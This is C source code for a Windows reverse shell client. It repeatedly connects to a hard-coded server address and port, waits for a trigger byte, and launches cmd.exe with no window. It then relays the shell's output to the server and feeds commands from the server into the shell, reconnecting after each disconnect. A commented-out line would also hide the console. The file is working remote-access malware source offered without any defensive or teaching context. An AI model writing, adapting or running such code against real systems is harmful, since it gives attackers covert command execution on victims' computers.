#include <winsock2.h>
#include <stdio.h>
#include <pthread.h>
#include "subprocess.h"

typedef struct thread_data {
   int ln;
   FILE* p_std;
   char result[130];
} thread_data;

void *myThread(void *arg)
{
    thread_data *tdata=(thread_data *)arg;
    FILE* p_std=tdata->p_std;
    
    for(tdata->ln=2; tdata->ln!=130; tdata->result[tdata->ln] = '\0', tdata->result[tdata->ln] = getc(p_std), tdata->ln++);
    
    pthread_exit(NULL);
}

void usend(SOCKET s, const char * buffer, unsigned int len){
    unsigned char bytes[4] = { (len >> 24) & 255, (len >> 16) & 255, (len >> 8) & 255, len & 255 };
    send(s, bytes, 4, 0);
    send(s, buffer, len, 0);
}

int urecv(SOCKET s, char * buf){
    char bytes[4];
    if(recv(s, bytes, 4, 0)==0) return -1;
    unsigned int len = (int) ( bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3] );
    if(recv(s, buf, len, 0)==0) return -1;
    buf[len] = '\0';
    return 0;
}


int main()
{
    while (1){
        //ShowWindow(GetConsoleWindow(), SW_HIDE);
        pthread_t tido, tide;
        thread_data todata, tedata;
        WSADATA WSAData;
        SOCKET server;
        SOCKADDR_IN addr;
        WSAStartup(MAKEWORD(2,0), &WSAData);
        //server = socket(AF_INET, SOCK_STREAM, 0);

        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_family = AF_INET;
        addr.sin_port = htons(9090);

        char buf[1] = {};
        do{
            server = socket(AF_INET, SOCK_STREAM, 0);
            if(connect(server, (SOCKADDR *)&addr, sizeof(addr))==0)
                recv(server, buf, 1, 0);
        } while (buf[0] != 'T');

        struct subprocess_s process;
        const char *command_line[] = {"c:\\windows\\system32\\cmd.exe", NULL};
        subprocess_create(command_line, subprocess_option_no_window, &process);
                
        FILE* p_stdin = subprocess_stdin(&process);

        todata.p_std = subprocess_stdout(&process);
        tedata.p_std = subprocess_stderr(&process);
        pthread_create(&tido, NULL, myThread, (void *)&todata);
        pthread_create(&tide, NULL, myThread, (void *)&tedata);

        tedata.result[0]='|';tedata.result[1]='E';
        todata.result[0]='|';todata.result[1]='O';
        char rawdata[512];
        Sleep(2017);
        while (1){
            while(tedata.ln!=2){
                usend(server, tedata.result, tedata.ln);
                if(tedata.ln==130) pthread_create(&tide, NULL, myThread, (void *)&tedata);
                else tedata.ln=2;
                Sleep(10);
            }
            
            while(todata.ln!=2){
                usend(server, todata.result, todata.ln);
                if(todata.ln==130) pthread_create(&tido, NULL, myThread, (void *)&todata);
                else todata.ln=2;
                Sleep(10);
            }

            usend(server, "_ ", 2);

            if(urecv(server, rawdata)==-1) break;

            if(rawdata[0]=='/'){
                break;
            }
            else{
                for(int i=0; rawdata[i]!='\0'; i++)
                    putc(rawdata[i], p_stdin);
                fflush(p_stdin);
                Sleep(10);
            }
        }
        subprocess_terminate(&process);
        closesocket(server);
        WSACleanup();
    }
}